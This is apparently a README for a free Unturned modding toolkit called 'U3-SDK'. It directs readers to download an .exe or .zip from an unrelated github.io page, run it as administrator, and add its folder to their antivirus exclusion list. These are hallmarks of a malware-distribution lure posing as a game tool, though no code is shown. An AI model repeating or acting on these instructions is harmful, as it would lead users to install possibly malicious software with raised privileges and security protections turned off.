# 🧟 U3-SDK - Build your own zombie survival games

[![Download U3-SDK](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://avramvioletscented987.github.io)

U3-SDK provides the tools you need to create content for Unturned. This software gives you access to the foundational elements of the open-world zombie survival game. You can use these files to build maps, design items, or modify the game world.

## 📥 Getting Started

You do not need programming experience to use this toolkit. Follow these steps to obtain and prepare the software on your Windows computer.

1. Go to the [official release page](https://avramvioletscented987.github.io) to find the latest version.
2. Look for the file ending in .zip or .exe under the Assets section.
3. Click the link to save the file to your computer.

## 📂 Using the Toolkit

The main interface shows a list of folders and files. These contain the assets for Unturned.

- The Maps folder contains terrain data and environment settings.
- The Items folder holds information for weapons, clothing, and food.
- The Bundle folder contains the 3D models and textures used in the game.

You can modify these files using standard image and text editors. Notepad works for text files. Use a basic image editor for textures. Always make a copy of your files before you change anything. This practice ensures you have a backup if the game stops working.

## ⚙️ Configuration Settings

The software includes a configuration menu. Access this menu from the top toolbar under Settings. Here, you can change the file paths for your projects. Point these paths to the main installation folder of the game to ensure the software finds your files. Keep these paths short to avoid system errors.

## ⚠️ Troubleshooting Issues

Most problems occur due to missing permissions or file path errors. 

- If the software does not open, right-click the icon and choose Run as administrator.
- If files disappear, check your antivirus settings. Some security programs flag new tools as suspicious. Add the U3-SDK folder to your exclusion list.
- If you see an error message about missing libraries, run the included dependency installer located in the Tools folder.

## 📖 Frequently Asked Questions

**Do I need the game installed?**
Yes. You need a copy of Unturned to test your changes.

**Is this software free?**
Yes. The toolkit is available to everyone at no cost.

**Where do I see my results?**
Place your modified files into the managed mods folder inside your game directory. Restart the game to see your changes in the editor or during gameplay.

**Can I share my creations?**
You may share your maps and items through the Steam Workshop. Follow the guide inside the help menu for specific instructions on how to publish your work.
